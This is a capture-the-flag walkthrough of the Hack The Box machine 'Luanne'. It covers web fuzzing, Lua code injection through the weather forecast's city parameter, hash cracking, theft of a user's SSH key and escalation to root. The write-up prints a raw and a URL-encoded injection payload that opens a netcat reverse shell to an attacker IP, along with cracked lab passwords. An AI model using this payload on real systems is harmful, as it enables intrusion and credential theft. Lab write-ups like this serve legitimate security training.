---
layout: page
title: Luanne
description: Write-up
dropdown: HTB-BOXES
priority: 1
---
# Luanne Walkthrough
![](https://i.ibb.co/wJw8Kzj/image.png)



# []()Methodology

* Nmap scan.
* Web enumertation.
* Lua code injection vulnerability.
* Getting reverse shell.
* Enumerate luanne.
* Getting id_rsa for a user.
* ssh connecting.
* Privilege escalation.
* RooTed.

## Nmap Scan:

**I Found 3 ports opened 22,80,9001.** 

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/64c7e259-9168-4229-9667-2595a8ddbe3a/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAT73L2G45O3KS52Y5%2F20210327%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20210327T221424Z&X-Amz-Expires=86400&X-Amz-Signature=3ab9ff28a0874d8669aae6712347e3a2c4e2ba8d7b3d8712c15c7e2644973109&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22)


### Let's start with the Web Page:

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/4d331ad0-6ca7-4f1d-909f-84f926e8d56e/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAT73L2G45O3KS52Y5%2F20210326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20210326T220747Z&X-Amz-Expires=86400&X-Amz-Signature=65b805dc8bf10b8ecc4d26e664344b6d9bee398bcc14798209258e3103428039&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22)

> **It has authentication pop-up.**

> **I Tried admin:admin and other random credentials but no thing fine to login.**

> **But i noticed that when i got (401 Unauthorized) that is a localhost web page at port 3000.**

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/3a02ba02-588c-4963-9dc7-24ea4943787e/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAT73L2G45O3KS52Y5%2F20210326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20210326T220955Z&X-Amz-Expires=86400&X-Amz-Signature=cc099e62053f11be44e021d0cb5e4789522f0935ca106604f5f0521d40de01a3&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22)


> #### I used ffuf for fuzzing luanne.htb/


![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/f6b5b7fb-096e-4093-8e4e-c60e9995e58e/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAT73L2G45O3KS52Y5%2F20210326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20210326T221725Z&X-Amz-Expires=86400&X-Amz-Signature=8fc77eddae8de86bd36a0cf5c68b9a9fabfd4662dd30c88f17b2a0a8bed8094f&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22)



* We got robots.txt

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/6ab319aa-1ec4-4590-b79a-3a1c662e4592/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAT73L2G45O3KS52Y5%2F20210326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20210326T221840Z&X-Amz-Expires=86400&X-Amz-Signature=d5b1629ee14b8a6800c3adbee52baa8619ee207b69bb3ef4a574e9163fb2d6b0&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22)

* /weather disallowd with comment: still harversting cities.

* access to luanne.htb/weather 404 not found.

* but there are cities we had to find them.

* let's fire up ffuf again to fuzz luanne.htb/weather/ 

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/4cc16698-a933-4e1f-b8fe-93d90e352b09/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAT73L2G45O3KS52Y5%2F20210326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20210326T222958Z&X-Amz-Expires=86400&X-Amz-Signature=671502ab015208afeb98b1e8115c50c54a76c79eac2badc5047ca95c6a2786ca&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22)

**Nice got forecast**

> * by visiting luanne.htb/weather/forecast/ got this.


![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/30d8f697-acbb-4e76-a9d3-f180eef28422/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAT73L2G45O3KS52Y5%2F20210326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20210326T223205Z&X-Amz-Expires=86400&X-Amz-Signature=54f272392356033508eb550b63db92bf354720ed6607b1ca1a05839ebf2b4a08&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22)


> #### Use city=list to list available cities 

*okay, Thanks*


![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/97f1a229-81a0-4fc5-a5bd-a1563ef5d03a/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAT73L2G45O3KS52Y5%2F20210326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20210326T223414Z&X-Amz-Expires=86400&X-Amz-Signature=1a4dc9c7f0f8694c1e8fa955301877b599fc83c7420080adeb386ce8f37a0d03&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22)

* It's just a weather statues for every city, I stucked here and got hint from HTB fourms. 

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/d25b6f67-0786-4f9a-a430-2037802b6cb9/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAT73L2G45O3KS52Y5%2F20210326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20210326T224449Z&X-Amz-Expires=86400&X-Amz-Signature=9ccb6b1fb1178961d4a5f681732eb4bd5fdec19c0ecd92531045733a69b1f4df&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22)

**Lua web application vulnerable to code injection by add a missing round brackets().**

* to get the shell we have to know the operating system and it's netBSD.
* by addind the missing round bracket to the shell.

```ruby
');os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.6 1234 >/tmp/f")—
``` 
**encode the url**
```ruby
http://luanne.htb/weather/forecast?city=%27%29%3Bos.execute%28%22rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.16.6%201234%20%3E%2Ftmp%2Ff%22%29--
```
## Getting reverse shell.

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/b64544ff-c962-4820-89c7-87d16bae551d/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAT73L2G45O3KS52Y5%2F20210326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20210326T233833Z&X-Amz-Expires=86400&X-Amz-Signature=1c932c8959ac3359021f96e9a027d6478eb9e2d448f981ecb0da2266efb56c24&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22)

```html
webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
```
* added to luanneWepApi.txt 

> **we have to crack this hash, so Used john to crack it**

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/98100502-7a21-44e9-a307-71009920d1f5/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAT73L2G45O3KS52Y5%2F20210327%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20210327T000029Z&X-Amz-Expires=86400&X-Amz-Signature=ba06437302ef5bb61103ad4745f4a1173b7f3ef368623bb14d2824626fb64d01&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22)

**we got iamthebest**

## Enumerate luanne.


![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/81c7b723-f8c6-4c67-815a-cc6fb50b694e/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAT73L2G45O3KS52Y5%2F20210327%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20210327T000501Z&X-Amz-Expires=86400&X-Amz-Signature=dc8d5eac59120d22d8e2ce98cbbbe5c7972cea09e34d87d602ce2f98b9405707&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22)

> * We got user r.michaels 

**Let's check the netstate** 

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/68cbe7e3-435c-4071-b0c2-362c4e020e4e/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAT73L2G45O3KS52Y5%2F20210327%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20210327T000734Z&X-Amz-Expires=86400&X-Amz-Signature=a44ed310321fbe5aa26f79c418f10a2cba6f2bdd49b10dfde7c7b76104cbdf03&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22)

> * There is a localhost web page on port 3000 and 3001. 

**Let's Dig more**

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/62151e89-8b1e-4410-81d0-576865571022/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAT73L2G45O3KS52Y5%2F20210327%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20210327T000947Z&X-Amz-Expires=86400&X-Amz-Signature=0feb6997691ee9f8b4fb6bc2d50bde74b6fbf1879abab801c6ce75945912f2c4&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22)


![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/274bfca7-5dc2-4e22-829e-fc635a640a9f/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAT73L2G45O3KS52Y5%2F20210327%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20210327T001005Z&X-Amz-Expires=86400&X-Amz-Signature=8eda012b3fa2de684229b9ed534e0dfe70be7b67d8d148d8b4beef47c8da1731&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22)

**I got hinted to dig more in port 3001 and get id_rsa.**

**So let's Try to curl the local web server in port 3001.**
```html
curl 127.0.0.1:3001/~r.michaels/.ssh/id_rsa
``` 

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/577680ad-0d62-4049-8807-06949f11b2bf/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAT73L2G45O3KS52Y5%2F20210327%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20210327T094912Z&X-Amz-Expires=86400&X-Amz-Signature=dc3af5a2ddd7f2616085ca6eb5b9a49d3f72286e038a5771c55efc9c4413f6a7&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22)

> **no items here so we can find it in /~r.michaels/id_rsa ,Because we enterted launne as _httpd so this folder shared through web that's why we found id_rsa in /~r.michaels/ not in /~r.michaels/.ssh/**


![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/cc2830e1-d413-45e5-b2e4-b08f25dc5971/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAT73L2G45O3KS52Y5%2F20210327%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20210327T104638Z&X-Amz-Expires=86400&X-Amz-Signature=24fa5d4156e6580b973a080a29bc407a275802c7282bbf4eb5fbe67b4de71d23&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22)

> **No Authorization, So let's login with "iamthebest"** 

```html
curl - -user webapi_user:iamthebest 127.0.0.1:3001/~r.michaels/id_rsa
```

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/c4319954-c801-4fd4-be32-ae661b5395f9/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAT73L2G45O3KS52Y5%2F20210327%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20210327T104907Z&X-Amz-Expires=86400&X-Amz-Signature=8ebcb5b89974c9bf25f1d1e439ae070680d0272aa7ca73600ed2902daf21e06a&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22)


## SSH connecting.


![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/39a3ea0a-a456-4cbc-85bb-f2a108f54ce1/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAT73L2G45O3KS52Y5%2F20210327%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20210327T110437Z&X-Amz-Expires=86400&X-Amz-Signature=30bda8b984028e7110f3f303ac6734f2b6c3f81c73e493926d29435fc55ebee1&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22)

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/d4ce4df0-4220-4d4e-9ecd-9d80f5d439f9/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAT73L2G45O3KS52Y5%2F20210327%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20210327T111708Z&X-Amz-Expires=86400&X-Amz-Signature=092e4423b90439f98569273f708bf73c7f3326654563b7268cdc2928b410450f&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22)

> **WE will use netpgp to decrypt devel_backup-2020-09-16.tar.gz.enc**

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/df9e3cd8-2f09-4ac2-9d4a-de75132cf62f/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAT73L2G45O3KS52Y5%2F20210327%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20210327T111924Z&X-Amz-Expires=86400&X-Amz-Signature=adcbf5ffb0181c3da4216b859d3e234763e346959dfbe9e3ead20d0d453149e7&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22)

> * we access to /webapi but no thing useful.


![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/7e6784ef-44d6-4f6d-966b-fa043e7f028b/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAT73L2G45O3KS52Y5%2F20210327%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20210327T112012Z&X-Amz-Expires=86400&X-Amz-Signature=234487128c019cc5bca0afed5d4355c31bc8a33b9ac6c36d8264b785be79deb4&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22)

> **we access to /www and got another webapi_user.**
 
![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/0e656a1a-424f-45c4-99e4-1ee73d0a2379/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAT73L2G45O3KS52Y5%2F20210327%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20210327T112121Z&X-Amz-Expires=86400&X-Amz-Signature=0979a19503435017e80de8bdb182cc4d32ff1aa4fb4a9df728d0cb02ae557d63&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22)

* webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.


#### As before we will use john to crack it.

> **we got"littlebear"**

**by switching to superuser permissions using sudo su...**

![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/18e18677-6eb5-4bf0-8f8f-e47caec1a68a/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAT73L2G45O3KS52Y5%2F20210327%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20210327T114025Z&X-Amz-Expires=86400&X-Amz-Signature=4fb1cad83fb9853f3930e6cbccf4411e5eb4c2c4d2b058b6cc7abcba4345120f&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22)

##### Command Not Found!!!

> **we had to find Alternatives for sudo su in netBSD operating system.**

* I found doas su, And that's ok.
* Surely we will use littlebear to get root.


![](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/9369b1ff-362e-42f6-920a-7a3eb88b5504/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAT73L2G45O3KS52Y5%2F20210327%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20210327T114352Z&X-Amz-Expires=86400&X-Amz-Signature=1daca75835fcf2777e7d4cdb8368c74cba25ed9acaedeab2f328f86131c3de40&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22Untitled.png%22)

# RooTed
![]()
![]()
![]()
![]()
![]()
![]()
![]()
![]()
![]()

